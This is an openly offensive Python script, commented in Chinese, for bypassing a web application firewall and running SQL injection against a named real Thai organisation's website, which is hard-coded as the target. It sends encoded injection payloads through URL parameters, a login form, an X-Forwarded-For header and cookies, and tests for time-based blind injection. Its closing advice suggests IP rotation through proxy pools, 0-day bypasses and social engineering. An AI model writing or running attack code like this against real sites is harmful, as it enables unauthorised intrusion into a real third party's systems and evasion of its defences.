#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF绕过SQL注入利用脚本 - peacoop.or.th
使用泰语编码和高级绕过技术
"""

import requests
import time
import json
from urllib.parse import quote
import random

class WAFBypassSQLInjection:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
        # 使用更真实的请求头
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        })
        
    def generate_thai_bypass_payloads(self):
        """生成泰语编码的绕过载荷"""
        
        # 泰语字符编码绕过
        thai_chars = [
            '\u0e01', '\u0e02', '\u0e03', '\u0e04', '\u0e05',  # 泰文字符
            '\u0e06', '\u0e07', '\u0e08', '\u0e09', '\u0e0a'
        ]
        
        # 基础SQL注入载荷
        base_payloads = [
            "' AND 1=1 -- ",
            "' OR 1=1 -- ",
            "' UNION SELECT ",
            "' AND SLEEP(5) -- "
        ]
        
        bypass_payloads = []
        
        for payload in base_payloads:
            # 添加泰语字符注释
            thai_comment = ''.join(random.sample(thai_chars, 3))
            bypassed = f"{thai_comment}{payload}{thai_comment}"
            bypass_payloads.append(bypassed)
            
            # URL编码版本
            url_encoded = quote(bypassed)
            bypass_payloads.append(url_encoded)
            
            # 双重编码
            double_encoded = quote(quote(bypassed))
            bypass_payloads.append(double_encoded)
        
        return bypass_payloads
    
    def test_bypass_methods(self):
        """测试各种绕过方法"""
        print("🔧 测试WAF绕过方法...")
        
        methods = [
            ("GET参数", self.test_get_injection),
            ("POST请求", self.test_post_injection),
            ("HTTP头注入", self.test_header_injection),
            ("Cookie注入", self.test_cookie_injection)
        ]
        
        for method_name, method_func in methods:
            print(f"\n🎯 测试{method_name}...")
            result = method_func()
            if result:
                print(f"  ✅ {method_name} 可能有效")
                return method_name, result
        
        return None, None
    
    def test_get_injection(self):
        """测试GET参数注入"""
        bypass_payloads = self.generate_thai_bypass_payloads()
        
        # 常见参数名
        param_names = ['id', 'q', 'search', 'query', 'page', 'category', 'product']
        
        for param in param_names:
            for payload in bypass_payloads[:10]:  # 测试前10个载荷
                try:
                    url = f"{self.base_url}/?{param}={payload}"
                    response = self.session.get(url, timeout=10)
                    
                    if response.status_code != 403:  # 不是被拒绝
                        print(f"  🔍 参数 {param} 状态码: {response.status_code}")
                        if response.status_code == 200:
                            return {"param": param, "payload": payload, "status": response.status_code}
                    
                except Exception as e:
                    continue
        
        return None
    
    def test_post_injection(self):
        """测试POST请求注入"""
        try:
            # 尝试登录表单注入
            login_data = {
                'username': "admin' OR '1'='1' -- ",
                'password': 'test',
                'submit': 'Login'
            }
            
            response = self.session.post(f"{self.base_url}/login", data=login_data, timeout=10)
            if response.status_code == 200 and 'admin' in response.text.lower():
                return {"method": "POST", "endpoint": "/login", "status": "success"}
                
        except Exception:
            pass
        
        return None
    
    def test_header_injection(self):
        """测试HTTP头注入"""
        try:
            # X-Forwarded-For 注入
            headers = {
                'X-Forwarded-For': "127.0.0.1' AND 1=1 -- "
            }
            
            response = self.session.get(self.base_url, headers=headers, timeout=10)
            if response.status_code == 200:
                return {"method": "Header", "header": "X-Forwarded-For", "status": "success"}
                
        except Exception:
            pass
        
        return None
    
    def test_cookie_injection(self):
        """测试Cookie注入"""
        try:
            # 设置恶意cookie
            self.session.cookies.set('session_id', "1' AND 1=1 -- ")
            self.session.cookies.set('user_id', "admin' OR '1'='1' -- ")
            
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                return {"method": "Cookie", "status": "success"}
                
        except Exception:
            pass
        
        return None
    
    def advanced_injection_techniques(self):
        """使用高级注入技术"""
        print("\n🚀 使用高级注入技术...")
        
        # 时间盲注
        print("⏱️  测试时间盲注...")
        start_time = time.time()
        
        try:
            # 时间延迟测试
            time_payload = "1' AND SLEEP(5) -- "
            url = f"{self.base_url}/?id={quote(time_payload)}"
            
            response = self.session.get(url, timeout=10)
            elapsed = time.time() - start_time
            
            if elapsed > 4:  # 有明显延迟
                print(f"  ✅ 时间盲注可能有效 (延迟: {elapsed:.2f}秒)")
                return {"technique": "Time-Based", "delay": elapsed}
            
        except requests.exceptions.Timeout:
            print("  ✅ 请求超时，时间盲注可能有效")
            return {"technique": "Time-Based", "status": "timeout"}
        except Exception as e:
            print(f"  ❌ 时间盲注测试失败: {e}")
        
        return None

def main():
    """主函数"""
    target_url = "https://peacoop.or.th"
    
    print("🐉 WAF绕过SQL注入利用 - peacoop.or.th")
    print("="*60)
    
    exploiter = WAFBypassSQLInjection(target_url)
    
    # 1. 测试各种绕过方法
    print("\n🎯 阶段1: WAF绕过测试")
    method, result = exploiter.test_bypass_methods()
    
    if method:
        print(f"  ✅ 发现有效方法: {method}")
        print(f"  详细信息: {result}")
    else:
        print("  ❌ 所有绕过方法都被阻止")
    
    # 2. 高级注入技术
    print("\n🎯 阶段2: 高级注入技术")
    advanced_result = exploiter.advanced_injection_techniques()
    
    if advanced_result:
        print(f"  ✅ 高级技术有效: {advanced_result}")
    
    # 3. 综合评估
    print("\n" + "="*60)
    print("📊 WAF绕过结果摘要")
    print("="*60)
    
    assessment = {
        "target": target_url,
        "waf_present": True,
        "bypass_methods_tested": ["GET", "POST", "Header", "Cookie"],
        "effective_method": method,
        "advanced_techniques": advanced_result,
        "overall_risk": "需要进一步测试",
        "recommendation": "使用更高级的绕过技术或更改攻击向量",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    print(f"目标: {assessment['target']}")
    print(f"WAF存在: {assessment['waf_present']}")
    print(f"有效方法: {assessment['effective_method']}")
    print(f"高级技术: {assessment['advanced_techniques']}")
    print(f"总体风险: {assessment['overall_risk']}")
    print(f"建议: {assessment['recommendation']}")
    
    # 保存结果
    with open("waf_bypass_results.json", "w", encoding="utf-8") as f:
        json.dump(assessment, f, indent=2, ensure_ascii=False)
    
    print(f"\n💾 结果已保存到: waf_bypass_results.json")
    
    if not method and not advanced_result:
        print("\n⚠️  目标WAF防护较强，建议:")
        print("1. 使用代理池轮换IP")
        print("2. 尝试0-day绕过技术") 
        print("3. 寻找其他攻击面")
        print("4. 使用社会工程学方法")

if __name__ == "__main__":
    main()